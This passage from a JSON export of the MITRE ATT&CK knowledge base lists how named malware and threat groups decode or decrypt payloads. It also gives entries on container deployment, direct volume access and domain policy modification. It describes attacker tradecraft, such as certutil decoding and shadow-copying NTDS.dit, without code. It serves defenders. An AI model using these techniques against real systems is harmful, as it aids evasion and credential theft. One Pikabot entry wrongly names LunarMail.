Stealer", "description": "Cuckoo Stealer strings are deobfuscated prior to execution."}, {"id": "S0687", "name": "Cyclops Blink", "description": "Cyclops Blink can decrypt and parse instructions sent from C2."}, {"id": "S1014", "name": "DanBot", "description": "DanBot can use a VBA macro to decode its payload prior to installation and execution."}, {"id": "S1111", "name": "DarkGate", "description": "DarkGate installation includes binary code stored in a file located in a hidden directory, such as shell.txt, that is decrypted then executed. DarkGate uses hexadecimal-encoded shellcode payloads during installation that are called via Windows API CallWindowProc() to decode and then execute."}, {"id": "G0012", "name": "Darkhotel", "description": "Darkhotel has decrypted strings and imports using RC4 during execution."}, {"id": "S1066", "name": "DarkTortilla", "description": "DarkTortilla can decrypt its payload and associated configuration elements using the Rijndael cipher."}, {"id": "S0673", "name": "DarkWatchman", "description": "DarkWatchman has the ability to self-extract as a RAR archive."}, {"id": "S0255", "name": "DDKONG", "description": "DDKONG decodes an embedded configuration using XOR."}, {"id": "S1052", "name": "DEADEYE", "description": "DEADEYE has the ability to combine multiple sections of a binary which were broken up to evade detection into a single .dll prior to execution."}, {"id": "S1134", "name": "DEADWOOD", "description": "DEADWOOD XORs some strings within the binary using the value 0xD5, and deobfuscates these items at runtime."}, {"id": "S0354", "name": "Denis", "description": "Denis will decrypt important strings used for C&C communication."}, {"id": "S0547", "name": "DropBook", "description": "DropBook can unarchive data downloaded from the C2 to obtain the payload and persistence modules."}, {"id": "S0502", "name": "Drovorub", "description": "Drovorub has de-obsfuscated XOR encrypted payloads in WebSocket messages."}, {"id": "S0567", "name": "Dtrack", "description": "Dtrack has used a decryption routine that is part of an executable physical patch."}, {"id": "S1158", "name": "DUSTPAN", "description": "DUSTPAN decodes and decrypts embedded payloads."}, {"id": "S1159", "name": "DUSTTRAP", "description": "DUSTTRAP deobfuscates embedded payloads."}, {"id": "S0024", "name": "Dyre", "description": "Dyre decrypts resources needed for targeting the victim."}, {"id": "G1006", "name": "Earth Lusca", "description": "Earth Lusca has used certutil to decode a string into a cabinet file."}, {"id": "S0377", "name": "Ebury", "description": "Ebury has verified C2 domain ownership by decrypting the TXT record using an embedded RSA public key."}, {"id": "S0624", "name": "Ecipekac", "description": "Ecipekac has the ability to decrypt fileless loader modules."}, {"id": "S0554", "name": "Egregor", "description": "Egregor has been decrypted before execution."}, {"id": "S0367", "name": "Emotet", "description": "Emotet has used a self-extracting RAR file to deliver modules to victims. Emotet has also extracted embedded executables from files using hard-coded buffer offsets."}, {"id": "S0634", "name": "EnvyScout", "description": "EnvyScout can deobfuscate and write malicious ISO files to disk."}, {"id": "S0401", "name": "Exaramel for Linux", "description": "Exaramel for Linux can decrypt its configuration file."}, {"id": "S0361", "name": "Expand", "description": "Expand can be used to decompress a local or remote CAB file into an executable."}, {"id": "S0512", "name": "FatDuke", "description": "FatDuke can decrypt AES encrypted C2 communications."}, {"id": "G1016", "name": "FIN13", "description": "FIN13 has utilized certutil to decode base64 encoded versions of custom malware."}, {"id": "S0355", "name": "Final1stspy", "description": "Final1stspy uses Python code to deobfuscate base64-encoded strings."}, {"id": "S0182", "name": "FinFisher", "description": "FinFisher extracts and decrypts stage 3 malware, which is stored in encrypted resources."}, {"id": "S0618", "name": "FIVEHANDS", "description": "FIVEHANDS has the ability to decrypt its payload prior to execution."}, {"id": "S0661", "name": "FoggyWeb", "description": "FoggyWeb can be decrypted in memory using a Lightweight Encryption Algorithm (LEA)-128 key and decoded using a XOR key."}, {"id": "S1120", "name": "FRAMESTING", "description": "FRAMESTING can decompress data received within POST requests."}, {"id": "C0001", "name": "Frankenstein", "description": "During Frankenstein, the threat actors deobfuscated Base64-encoded commands following the execution of a malicious script, which revealed a small script designed to obtain an additional payload."}, {"id": "S0628", "name": "FYAnti", "description": "FYAnti has the ability to decrypt an embedded .NET module."}, {"id": "G0047", "name": "Gamaredon Group", "description": "Gamaredon Group tools decrypted additional payloads from the C2. Gamaredon Group has also decoded base64-encoded source code of a downloader. Additionally, Gamaredon Group has decoded Telegram content to reveal the IP address for C2 communications."}, {"id": "S0666", "name": "Gelsemium", "description": "Gelsemium can decompress and decrypt DLLs and shellcode."}, {"id": "S0032", "name": "gh0st RAT", "description": "gh0st RAT has decrypted and loaded the gh0st RAT DLL into memory, once the initial dropper executable is launched."}, {"id": "S1117", "name": "GLASSTOKEN", "description": "GLASSTOKEN has the ability to decode hexadecimal and Base64 C2 requests."}, {"id": "S0588", "name": "GoldMax", "description": "GoldMax has decoded and decrypted the configuration file when executed."}, {"id": "S0477", "name": "Goopy", "description": "Goopy has used a polymorphic decryptor to decrypt itself at runtime."}, {"id": "S1138", "name": "Gootloader", "description": "Gootloader has the ability to decode and decrypt malicious payloads prior to execution."}, {"id": "G0078", "name": "Gorgon Group", "description": "Gorgon Group malware can decode contents from a payload that was Base64 encoded and write the contents to a file."}, {"id": "S0531", "name": "Grandoreiro", "description": "Grandoreiro can decrypt its encrypted internal strings."}, {"id": "S0690", "name": "Green Lambert", "description": "Green Lambert can use multiple custom routines to decrypt strings prior to execution."}, {"id": "S0632", "name": "GrimAgent", "description": "GrimAgent can use a decryption algorithm for strings based on Rotate on Right (RoR) and Rotate on Left (RoL) functionality."}, {"id": "S0499", "name": "Hancitor", "description": "Hancitor has decoded Base64 encoded URLs to insert a recipient\u2019s name into the filename of the Word document. Hancitor has also extracted executables from ZIP files."}, {"id": "S0697", "name": "HermeticWiper", "description": "HermeticWiper can decompress and copy driver files using LZCopy."}, {"id": "S1027", "name": "Heyoka Backdoor", "description": "Heyoka Backdoor can decrypt its payload prior to execution."}, {"id": "S0394", "name": "HiddenWasp", "description": "HiddenWasp uses a cipher to implement a decoding function."}, {"id": "G0126", "name": "Higaisa", "description": "Higaisa used certutil to decode Base64 binaries at runtime and a 16-byte XOR key to decrypt data."}, {"id": "S0601", "name": "Hildegard", "description": "Hildegard has decrypted ELF files with AES."}, {"id": "S1097", "name": "HUI Loader", "description": "HUI Loader can decrypt and load files containing malicious payloads."}, {"id": "S0398", "name": "HyperBro", "description": "HyperBro can unpack and decrypt its payload prior to execution."}, {"id": "S1022", "name": "IceApple", "description": "IceApple can use a Base64-encoded AES key to decrypt tasking."}, {"id": "S0434", "name": "Imminent Monitor", "description": "Imminent Monitor has decoded malware components that are then dropped to the system."}, {"id": "S1139", "name": "INC Ransomware", "description": "INC Ransomware can run CryptStringToBinaryA to decrypt base64 content containing its ransom note."}, {"id": "S0604", "name": "Industroyer", "description": "Industroyer decrypts code to connect to a remote C2 server."}, {"id": "S0260", "name": "InvisiMole", "description": "InvisiMole can decrypt, unpack and load a DLL from its resources, or from blobs encrypted with Data Protection API, two-key triple DES, and variations of the XOR cipher."}, {"id": "S0581", "name": "IronNetInjector", "description": "IronNetInjector has the ability to decrypt embedded .NET and PE payloads."}, {"id": "S0189", "name": "ISMInjector", "description": "ISMInjector uses the certutil command to decode a payload file."}, {"id": "G0004", "name": "Ke3chang", "description": "Ke3chang has deobfuscated Base64-encoded shellcode strings prior to loading them."}, {"id": "S0585", "name": "Kerrdown", "description": "Kerrdown can decode, decrypt, and decompress multiple layers of shellcode."}, {"id": "S0487", "name": "Kessel", "description": "Kessel has decrypted the binary's configuration once the main function was launched."}, {"id": "S1051", "name": "KEYPLUG", "description": "KEYPLUG can decode its configuration file to determine C2 protocols."}, {"id": "S0526", "name": "KGH_SPY", "description": "KGH_SPY can decrypt encrypted strings and write them to a newly created folder."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has decoded malicious VBScripts using Base64."}, {"id": "S0641", "name": "Kobalos", "description": "Kobalos decrypts strings right after the initial communication, but before the authentication process."}, {"id": "S0669", "name": "KOCTOPUS", "description": "KOCTOPUS has deobfuscated itself before executing its commands."}, {"id": "S0356", "name": "KONNI", "description": "KONNI has used certutil to download and decode base64 encoded strings and has also devoted a custom section to performing all the components of the deobfuscation process."}, {"id": "S0236", "name": "Kwampirs", "description": "Kwampirs decrypts and extracts a copy of its main DLL payload when executing."}, {"id": "S1160", "name": "Latrodectus", "description": "Latrodectus has the ability to deobfuscate encrypted strings."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group has used shellcode within macros to decrypt and manually map DLLs and shellcode into memory at runtime."}, {"id": "G0065", "name": "Leviathan", "description": "Leviathan has used a DLL known as SeDll to decrypt and execute other JavaScript backdoors."}, {"id": "S0395", "name": "LightNeuron", "description": "LightNeuron has used AES and XOR to decrypt configuration files and commands."}, {"id": "S1119", "name": "LIGHTWIRE", "description": "LIGHTWIRE can RC4 decrypt and Base64 decode C2 commands."}, {"id": "S0513", "name": "LiteDuke", "description": "LiteDuke has the ability to decrypt and decode multiple layers of obfuscation."}, {"id": "S0681", "name": "Lizar", "description": "Lizar can decrypt its configuration data."}, {"id": "S0447", "name": "Lokibot", "description": "Lokibot has decoded and decrypted its stages multiple times using hard-coded keys to deliver the final payload, and has decoded its server response hex string using XOR."}, {"id": "S0582", "name": "LookBack", "description": "LookBack has a function that decrypts malicious data."}, {"id": "S0532", "name": "Lucifer", "description": "Lucifer can decrypt its C2 address upon execution."}, {"id": "S1143", "name": "LunarLoader", "description": "LunarLoader can deobfuscate files containing the next stages in the infection chain."}, {"id": "S1142", "name": "LunarMail", "description": "LunarMail can decrypt strings to retrieve configuration settings."}, {"id": "S1141", "name": "LunarWeb", "description": "LunarWeb can decrypt strings related to communication configuration using RC4 with a static key."}, {"id": "S0409", "name": "Machete", "description": "Machete\u2019s downloaded data is decrypted using AES."}, {"id": "S1016", "name": "MacMa", "description": "MacMa decrypts a downloaded file using AES-128-EBC with a custom delta."}, {"id": "S1060", "name": "Mafalda", "description": "Mafalda can decrypt files and data."}, {"id": "G1026", "name": "Malteiro", "description": "Malteiro has the ability to deobfuscate downloaded files prior to execution."}, {"id": "S0576", "name": "MegaCortex", "description": "MegaCortex has used a Base64 key to decode its components."}, {"id": "G0045", "name": "menuPass", "description": "menuPass has used certutil in a macro to decode base64-encoded content contained in a dropper document attached to an email. The group has also used certutil -decode to decode files on the victim\u2019s machine when dropping UPPERCUT."}, {"id": "S0443", "name": "MESSAGETAP", "description": "After checking for the existence of two files, keyword_parm.txt and parm.txt, MESSAGETAP XOR decodes and read the contents of the files. "}, {"id": "S1059", "name": "metaMain", "description": "metaMain can decrypt and load other modules."}, {"id": "S0455", "name": "Metamorfo", "description": "Upon execution, Metamorfo has unzipped itself after being downloaded to the system and has performed string decryption."}, {"id": "S0280", "name": "MirageFox", "description": "MirageFox has a function for decrypting data containing C2 configuration information."}, {"id": "S1122", "name": "Mispadu", "description": "Mispadu decrypts its encrypted configuration files prior to execution."}, {"id": "G0021", "name": "Molerats", "description": "Molerats decompresses ZIP files once on the victim machine."}, {"id": "S1026", "name": "Mongall", "description": "Mongall has the ability to decrypt its payload prior to execution."}, {"id": "G1036", "name": "Moonstone Sleet", "description": "Moonstone Sleet delivered payloads using multiple rounds of obfuscation and encoding to evade defenses and analysis."}, {"id": "S0284", "name": "More_eggs", "description": "More_eggs will decode malware components that are then dropped to the system."}, {"id": "S1047", "name": "Mori", "description": "Mori can resolve networking APIs from strings that are ADD-encrypted."}, {"id": "G0069", "name": "MuddyWater", "description": "MuddyWater has decoded base64-encoded PowerShell, JavaScript, and VBScript."}, {"id": "S0637", "name": "NativeZone", "description": "NativeZone can decrypt and decode embedded  Cobalt Strike beacon stage shellcode."}, {"id": "S0457", "name": "Netwalker", "description": "Netwalker's PowerShell script can decode and decrypt multiple layers of obfuscation, leading to the Netwalker DLL being loaded into memory."}, {"id": "S1147", "name": "Nightdoor", "description": "Nightdoor stores network configuration data in a file XOR encoded with the key value of 0x7A."}, {"id": "S1100", "name": "Ninja", "description": "The Ninja loader component can decrypt and decompress the payload."}, {"id": "S0353", "name": "NOKKI", "description": "NOKKI uses a unique, custom de-obfuscation technique."}, {"id": "G0049", "name": "OilRig", "description": "A OilRig macro has run a PowerShell command to decode file contents. OilRig has also used certutil to decode base64-encoded files on victims."}, {"id": "S0439", "name": "Okrum", "description": "Okrum's loader can decrypt the backdoor code, embedded within the loader or within a legitimate PNG file. A custom XOR cipher or RC4 is used for decryption."}, {"id": "S0052", "name": "OnionDuke", "description": "OnionDuke can use a custom decryption algorithm to decrypt strings."}, {"id": "S0264", "name": "OopsIE", "description": "OopsIE concatenates then decompresses multiple resources to load an embedded .Net Framework assembly."}, {"id": "C0016", "name": "Operation Dust Storm", "description": "During Operation Dust Storm, attackers used VBS code to decode payloads."}, {"id": "C0006", "name": "Operation Honeybee", "description": "During Operation Honeybee, malicious files were decoded prior to execution."}, {"id": "C0005", "name": "Operation Spalax", "description": "For Operation Spalax, the threat actors used a variety of packers and droppers to decrypt malicious payloads."}, {"id": "S0402", "name": "OSX/Shlayer", "description": "OSX/Shlayer can base64-decode and AES-decrypt downloaded payloads. Versions of OSX/Shlayer pass encrypted and password-protected code to openssl and then write the payload to the /tmp folder."}, {"id": "S0352", "name": "OSX_OCEANLOTUS.D", "description": "OSX_OCEANLOTUS.D uses a decode routine combining bit shifting and XOR operations with a variable key that depends on the length of the string that was encoded. If the computation for the variable XOR key turns out to be 0, the default XOR key of 0x1B is used. This routine is also referenced as the rotate function in reporting."}, {"id": "S0598", "name": "P.A.S. Webshell", "description": "P.A.S. Webshell can use a decryption mechanism to process a user supplied password and allow execution."}, {"id": "S1050", "name": "PcShare", "description": "PcShare has decrypted its strings by applying a XOR operation and a decompression using a custom implemented LZM algorithm."}, {"id": "S1145", "name": "Pikabot", "description": "Pikabot decrypts command and control URIs using ADVobfuscator, and decrypts IP addresses and port numbers with a custom algorithm. Other versions of Pikabot decode chunks of stored stage 2 payload content in the initial payload .text section before consolidating them for further execution. Overall LunarMail is associated with multiple encoding and encryption mechanisms to obfuscate the malware's presence and avoid analysis or detection."}, {"id": "S0517", "name": "Pillowmint", "description": "Pillowmint has been decompressed by included shellcode prior to being launched."}, {"id": "S1031", "name": "PingPull", "description": "PingPull can decrypt received data from its C2 server by using AES."}, {"id": "S0501", "name": "PipeMon", "description": "PipeMon can decrypt password-protected executables."}, {"id": "S1123", "name": "PITSTOP", "description": "PITSTOP can deobfuscate base64 encoded and AES encrypted commands."}, {"id": "S0013", "name": "PlugX", "description": "PlugX decompresses and decrypts itself using the Microsoft API call RtlDecompressBuffer."}, {"id": "S0428", "name": "PoetRAT", "description": "PoetRAT has used LZMA and base64 libraries to decode obfuscated scripts."}, {"id": "S0518", "name": "PolyglotDuke", "description": "PolyglotDuke can use a custom algorithm to decrypt strings used by the malware."}, {"id": "S1012", "name": "PowerLess", "description": "PowerLess can use base64 and AES ECB decryption prior to execution of downloaded modules."}, {"id": "S0223", "name": "POWERSTATS", "description": "POWERSTATS can deobfuscate the main backdoor code."}, {"id": "S1046", "name": "PowGoop", "description": "PowGoop can decrypt PowerShell scripts for execution."}, {"id": "S0279", "name": "Proton", "description": "Proton uses an encrypted file to store commands and configuration values."}, {"id": "S0613", "name": "PS1", "description": "PS1 can use an XOR key to decrypt a PowerShell loader and payload binary."}, {"id": "S0147", "name": "Pteranodon", "description": "Pteranodon can decrypt encrypted data strings prior to using them."}, {"id": "S0196", "name": "PUNCHBUGGY", "description": "PUNCHBUGGY has used PowerShell to decode base64-encoded assembly."}, {"id": "S1032", "name": "PyDCrypt", "description": "PyDCrypt has decrypted and dropped the DCSrv payload to disk."}, {"id": "S0650", "name": "QakBot", "description": "QakBot can deobfuscate and re-assemble code strings for execution."}, {"id": "S0269", "name": "QUADAGENT", "description": "QUADAGENT uses AES and a preshared key to decrypt the custom Base64 routine used to encode strings and scripts."}, {"id": "S1076", "name": "QUIETCANARY", "description": "QUIETCANARY can use a custom parsing routine to decode the command codes and additional parameters from the C2 before executing them."}, {"id": "S1148", "name": "Raccoon Stealer", "description": "Raccoon Stealer uses RC4-encrypted, base64-encoded strings to obfuscate functionality and command and control servers."}, {"id": "S0565", "name": "Raindrop", "description": "Raindrop decrypted its Cobalt Strike payload using an AES-256 encryption algorithm in CBC mode with a unique key per sample."}, {"id": "S0629", "name": "RainyDay", "description": "RainyDay can decrypt its payload via a XOR key."}, {"id": "S0458", "name": "Ramsay", "description": "Ramsay can extract its agent from the body of a malicious document."}, {"id": "S1113", "name": "RAPIDPULSE", "description": "RAPIDPULSE listens for specific HTTP query parameters in received communications. If specific parameters match, a hard-coded RC4 key is used to decrypt the HTTP query paremter hmacTime. This decrypts to a filename that is then open, read, encrypted with the same RC4 key, base64-encoded, written to standard out, then passed as a response to the HTTP request."}, {"id": "S1130", "name": "Raspberry Robin", "description": "Raspberry Robin contains several layers of obfuscation to hide malicious code from detection and analysis."}, {"id": "S0495", "name": "RDAT", "description": "RDAT can deobfuscate the base64-encoded and AES-encrypted files downloaded from the C2 server."}, {"id": "S0511", "name": "RegDuke", "description": "RegDuke can decrypt strings with a key either stored in the Registry or hardcoded in the code."}, {"id": "S0375", "name": "Remexi", "description": "Remexi decrypts the configuration data using XOR with 25-character keys."}, {"id": "S0496", "name": "REvil", "description": "REvil can decode encrypted strings to enable execution of commands and payloads."}, {"id": "S0258", "name": "RGDoor", "description": "RGDoor decodes Base64 strings and decrypts strings using a custom XOR algorithm."}, {"id": "S0448", "name": "Rising Sun", "description": "Rising Sun has decrypted itself using a single-byte XOR scheme. Additionally, Rising Sun can decrypt its configuration data at runtime."}, {"id": "S1150", "name": "ROADSWEEP", "description": "ROADSWEEP can decrypt embedded scripts prior to execution."}, {"id": "G0106", "name": "Rocke", "description": "Rocke has extracted tar.gz files after downloading them from a C2 server."}, {"id": "S0270", "name": "RogueRobin", "description": "RogueRobin decodes an embedded executable using base64 and decompresses it."}, {"id": "S0240", "name": "ROKRAT", "description": "ROKRAT can decrypt strings using the victim's hostname as the key."}, {"id": "S1078", "name": "RotaJakiro", "description": "RotaJakiro uses the AES algorithm, bit shifts in a function called rotate, and an XOR cipher to decrypt resources required for persistence, process guarding, and file locking. It also performs this same function on encrypted stack strings and the head and key sections in the network packet structure used for C2 communications."}, {"id": "S1018", "name": "Saint Bot", "description": "Saint Bot can deobfuscate strings and files for execution."}, {"id": "G0034", "name": "Sandworm Team", "description": "Sandworm Team's VBS backdoor can decode Base64-encoded data and save it to the %TEMP% folder. The group also decrypted received information using the Triple DES algorithm and decompresses it using GZip."}, {"id": "S1085", "name": "Sardonic", "description": "Sardonic can first decrypt with the RC4 algorithm using a hardcoded decryption key before decompressing."}, {"id": "S0461", "name": "SDBbot", "description": "SDBbot has the ability to decrypt and decompress its payload to enable code execution."}, {"id": "S0596", "name": "ShadowPad", "description": "ShadowPad has decrypted a binary blob to start execution."}, {"id": "S0140", "name": "Shamoon", "description": "Shamoon decrypts ciphertext using an XOR cipher and a base64-encoded string."}, {"id": "S1019", "name": "Shark", "description": "Shark can extract and decrypt downloaded .zip files."}, {"id": "S0546", "name": "SharpStage", "description": "SharpStage has decompressed data received from the C2 server."}, {"id": "S0444", "name": "ShimRat", "description": "ShimRat has decompressed its core DLL using shellcode once an impersonated antivirus component was running on a system."}, {"id": "S0589", "name": "Sibot", "description": "Sibot can decrypt data received from a C2 and save to a file."}, {"id": "S0610", "name": "SideTwist", "description": "SideTwist can decode and decrypt messages received from C2."}, {"id": "S0623", "name": "Siloscape", "description": "Siloscape has decrypted the password of the C2 server with a simple byte by byte XOR. Siloscape also writes both an archive of Tor and the unzip binary to disk from data embedded within the payload using Visual Studio\u2019s Resource Manager."}, {"id": "S0468", "name": "Skidmap", "description": "Skidmap has the ability to download, unpack, and decrypt tar.gz files ."}, {"id": "S1110", "name": "SLIGHTPULSE", "description": "SLIGHTPULSE can deobfuscate base64 encoded and RC4 encrypted C2 messages."}, {"id": "S0226", "name": "Smoke Loader", "description": "Smoke Loader deobfuscates its code."}, {"id": "S1086", "name": "Snip3", "description": "Snip3 can decode its second-stage PowerShell script prior to execution."}, {"id": "C0024", "name": "SolarWinds Compromise", "description": "During the SolarWinds Compromise, APT29 used 7-Zip to decode their Raindrop malware."}, {"id": "S0615", "name": "SombRAT", "description": "SombRAT can run upload to decrypt and upload files from storage."}, {"id": "S0516", "name": "SoreFang", "description": "SoreFang can decode and decrypt exfiltrated data sent to C2."}, {"id": "S0543", "name": "Spark", "description": "Spark has used a custom XOR algorithm to decrypt the payload."}, {"id": "S1140", "name": "Spica", "description": "Upon execution Spica can decode an embedded .pdf and write it to the desktop as a decoy document."}, {"id": "S0390", "name": "SQLRat", "description": "SQLRat has scripts that are responsible for deobfuscating additional scripts."}, {"id": "S1030", "name": "Squirrelwaffle", "description": "Squirrelwaffle has decrypted files and payloads using a XOR-based algorithm."}, {"id": "S0188", "name": "Starloader", "description": "Starloader decrypts and executes shellcode from a file called Stars.jps."}, {"id": "S1112", "name": "STEADYPULSE", "description": "STEADYPULSE can URL decode key/value pairs sent over C2."}, {"id": "S0603", "name": "Stuxnet", "description": "Stuxnet decrypts resources that are loaded into memory and executed."}, {"id": "S0562", "name": "SUNSPOT", "description": "SUNSPOT decrypts SUNBURST, which was stored in AES128-CBC encrypted blobs."}, {"id": "S0663", "name": "SysUpdate", "description": "SysUpdate can deobfuscate packed binaries in memory."}, {"id": "G0092", "name": "TA505", "description": "TA505 has decrypted packed DLLs with an XOR key."}, {"id": "S0011", "name": "Taidoor", "description": "Taidoor can use a stream cipher to decrypt stings used by the malware."}, {"id": "G0139", "name": "TeamTNT", "description": "TeamTNT has used a script that decodes a Base64-encoded version of WeaveWorks Scope."}, {"id": "S0560", "name": "TEARDROP", "description": "TEARDROP was decoded using a custom rolling XOR algorithm to execute a customized Cobalt Strike payload."}, {"id": "G0027", "name": "Threat Group-3390", "description": "During execution, Threat Group-3390 malware deobfuscates and decompresses code that was encoded with Metasploit\u2019s shikata_ga_nai encoder as well as compressed with LZNT1 compression."}, {"id": "S0665", "name": "ThreatNeedle", "description": "ThreatNeedle can decrypt its payload using RC4, AES, or one-byte XORing."}, {"id": "S0678", "name": "Torisma", "description": "Torisma has used XOR and Base64 to decode C2 data."}, {"id": "S0266", "name": "TrickBot", "description": "TrickBot decodes the configuration data and modules."}, {"id": "G0081", "name": "Tropic Trooper", "description": "Tropic Trooper used shellcode with an XOR algorithm to decrypt a payload. Tropic Trooper also decrypted image files which contained a payload."}, {"id": "S0436", "name": "TSCookie", "description": "TSCookie has the ability to decrypt, load, and execute a DLL and its resources."}, {"id": "S0647", "name": "Turian", "description": "Turian has the ability to use a XOR decryption key to extract C2 server domains and IP addresses."}, {"id": "G0010", "name": "Turla", "description": "Turla has used a custom decryption routine, which pulls key and salt values from other artifacts such as a WMI filter or PowerShell Profile, to decode encrypted PowerShell payloads."}, {"id": "S0263", "name": "TYPEFRAME", "description": "One TYPEFRAME variant decrypts an archive using an RC4 key, then decompresses and installs the decrypted malicious DLL module. Another variant decodes the embedded file by XORing it with the value \"0x35\"."}, {"id": "S0022", "name": "Uroburos", "description": "Uroburos can decrypt command parameters sent through C2 and use unpacking code to extract its packed executable."}, {"id": "S0386", "name": "Ursnif", "description": "Ursnif has used crypto key information stored in the Registry to decrypt Tor clients dropped to disk."}, {"id": "S0476", "name": "Valak", "description": "Valak has the ability to decode and decrypt downloaded files."}, {"id": "S0636", "name": "VaporRage", "description": "VaporRage can deobfuscate XOR-encoded shellcode prior to execution."}, {"id": "S0257", "name": "VERMIN", "description": "VERMIN decrypts code, strings, and commands to use once it's on the victim's machine."}, {"id": "S0180", "name": "Volgmer", "description": "Volgmer deobfuscates its strings and APIs once its executed."}, {"id": "S0670", "name": "WarzoneRAT", "description": "WarzoneRAT can use XOR 0x45 to decrypt obfuscated code."}, {"id": "S0612", "name": "WastedLocker", "description": "WastedLocker's custom cryptor, CryptOne, used an XOR based algorithm to decrypt the payload."}, {"id": "C0037", "name": "Water Curupira Pikabot Distribution", "description": "Water Curupira Pikabot Distribution used highly obfuscated JavaScript files as one initial installer for Pikabot."}, {"id": "S0579", "name": "Waterbear", "description": "Waterbear has the ability to decrypt its RC4 encrypted payload for execution."}, {"id": "S0515", "name": "WellMail", "description": "WellMail can decompress scripts received from C2."}, {"id": "S0514", "name": "WellMess", "description": "WellMess can decode and decrypt data received from C2."}, {"id": "S0689", "name": "WhisperGate", "description": "WhisperGate can deobfuscate downloaded files stored in reverse byte order and decrypt embedded resources using multiple XOR operations."}, {"id": "S0466", "name": "WindTail", "description": "WindTail has the ability to decrypt strings using hard-coded AES keys."}, {"id": "S0430", "name": "Winnti for Linux", "description": "Winnti for Linux has decoded XOR encoded strings holding its configuration upon execution."}, {"id": "S0141", "name": "Winnti for Windows", "description": "The Winnti for Windows dropper can decrypt and decompresses a data blob."}, {"id": "G1035", "name": "Winter Vivern", "description": "Winter Vivern delivered exploit payloads via base64-encoded payloads in malicious email messages."}, {"id": "S1115", "name": "WIREFIRE", "description": "WIREFIRE can decode, decrypt, and decompress data received in C2 HTTP POST requests."}, {"id": "G0090", "name": "WIRTE", "description": "WIRTE has used Base64 to decode malicious VBS script."}, {"id": "S1065", "name": "Woody RAT", "description": "Woody RAT can deobfuscate Base64-encoded strings and scripts."}, {"id": "S0653", "name": "xCaon", "description": "xCaon has decoded strings from the C2 server before executing commands."}, {"id": "S0388", "name": "YAHOYAH", "description": "YAHOYAH decrypts downloaded files before execution."}, {"id": "S0251", "name": "Zebrocy", "description": "Zebrocy decodes its secondary payload and writes it to the victim\u2019s machine. Zebrocy also uses AES and XOR to decrypt strings and payloads."}, {"id": "S0230", "name": "ZeroT", "description": "ZeroT shellcode decrypts and decompresses its RC4-encrypted payload."}, {"id": "S0330", "name": "Zeus Panda", "description": "Zeus Panda decrypts strings in the code during the execution process."}, {"id": "G0128", "name": "ZIRCONIUM", "description": "ZIRCONIUM has used the AES256 algorithm with a SHA1 derived key to decrypt exploit code."}, {"id": "S1013", "name": "ZxxZ", "description": "ZxxZ has used a XOR key to decrypt strings."}], "sub_techniques": []}, {"name": "Deploy Container", "description": "Adversaries may deploy a container into an environment to facilitate execution or evade defenses. In some cases, adversaries may deploy a new container to execute processes associated with a particular image or deployment, such as processes that execute or download malware. In others, an adversary may deploy a new container configured without network rules, user limitations, etc. to bypass existing defenses within the environment. In Kubernetes environments, an adversary may attempt to deploy a privileged or vulnerable container into a specific node in order to Escape to Host and access other containers running on the node.", "detailed_description": "Adversaries may deploy a container into an environment to facilitate execution or evade defenses. In some cases, adversaries may deploy a new container to execute processes associated with a particular image or deployment, such as processes that execute or download malware. In others, an adversary may deploy a new container configured without network rules, user limitations, etc. to bypass existing defenses within the environment. In Kubernetes environments, an adversary may attempt to deploy a privileged or vulnerable container into a specific node in order to Escape to Host and access other containers running on the node. \nContainers can be deployed by various means, such as via Docker's create and start APIs or via a web application such as the Kubernetes dashboard or Kubeflow.  In Kubernetes environments, containers may be deployed through workloads such as ReplicaSets or DaemonSets, which can allow containers to be deployed across multiple nodes. Adversaries may deploy containers based on retrieved or built malicious images or from benign images that download and execute malicious payloads at runtime.", "id": "T1610", "examples": [{"id": "S0600", "name": "Doki", "description": "Doki was run through a deployed container."}, {"id": "S0599", "name": "Kinsing", "description": "Kinsing was run through a deployed Ubuntu container."}, {"id": "S0683", "name": "Peirates", "description": "Peirates can deploy a pod that mounts its node\u2019s root file system, then execute a command to create a reverse shell on the node."}, {"id": "G0139", "name": "TeamTNT", "description": "TeamTNT has deployed different types of containers into victim environments to facilitate execution. TeamTNT has also transferred cryptocurrency mining software to Kubernetes clusters discovered within local IP address ranges."}], "sub_techniques": []}, {"name": "Direct Volume Access", "description": "Adversaries may directly access a volume to bypass file access controls and file system monitoring. Windows allows programs to have direct access to logical volumes. Programs with direct access may read and write files directly from the drive by analyzing file system data structures. This technique may bypass Windows file access controls as well as file system monitoring tools.", "detailed_description": "Adversaries may directly access a volume to bypass file access controls and file system monitoring. Windows allows programs to have direct access to logical volumes. Programs with direct access may read and write files directly from the drive by analyzing file system data structures. This technique may bypass Windows file access controls as well as file system monitoring tools. \nUtilities, such as NinjaCopy, exist to perform these actions in PowerShell. Adversaries may also use built-in or third-party utilities (such as vssadmin, wbadmin, and esentutl) to create shadow copies or backups of data from system volumes.", "id": "T1006", "examples": [{"id": "S0404", "name": "esentutl", "description": "esentutl can use the Volume Shadow Copy service to copy locked files such as ntds.dit."}, {"id": "G1015", "name": "Scattered Spider", "description": "Scattered Spider has created volume shadow copies of virtual domain controller disks to extract the NTDS.dit file."}, {"id": "G1017", "name": "Volt Typhoon", "description": "Volt Typhoon has executed the Windows-native vssadmin command to create volume shadow copies."}], "sub_techniques": []}, {"name": "Domain or Tenant Policy Modification", "description": "Adversaries may modify the configuration settings of a domain or identity tenant to evade defenses and/or escalate privileges in centrally managed environments. Such services provide a centralized means of managing identity resources such as devices and accounts, and often include configuration settings that may apply between domains or tenants such as trust relationships, identity syncing, or identity federation.", "detailed_description": "Adversaries may modify the configuration settings of a domain or identity tenant to evade defenses and/or escalate privileges in centrally managed environments. Such services provide a centralized means of managing identity resources such as devices and accounts, and often include configuration settings that may apply between domains or tenants such as trust relationships, identity syncing, or identity federation.\nModifications to domain or tenant settings may include altering domain Group Policy Objects (GPOs) in Microsoft Active Directory (AD) or changing trust settings for domains, including federation trusts relationships between domains or tenants.\nWith sufficient permissions, adversaries can modify domain or tenant policy settings. Since configuration settings for these services apply to a large number of identity resources, there are a great number of potential attacks malicious outcomes that can stem from this abuse. Examples of such abuse include:\nAdversaries may temporarily modify domain or tenant policy, carry out a malicious action(s), and then revert the change to remove suspicious indicators.", "id": "T1484", "examples": [], "sub_techniques": [{"name": "Group Policy Modification", "description": "Adversaries may modify Group Policy Objects (GPOs) to subvert the intended discretionary access controls for a domain, usually with the intention of escalating privileges on the domain. Group policy allows for centralized management of user and computer settings in Active Directory (AD). GPOs are containers for group policy settings made up of files stored within a predictable network path \\<DOMAIN>\\SYSVOL\\<DOMAIN>\\Policies\\.", "detailed_description": "Adversaries may modify Group Policy Objects 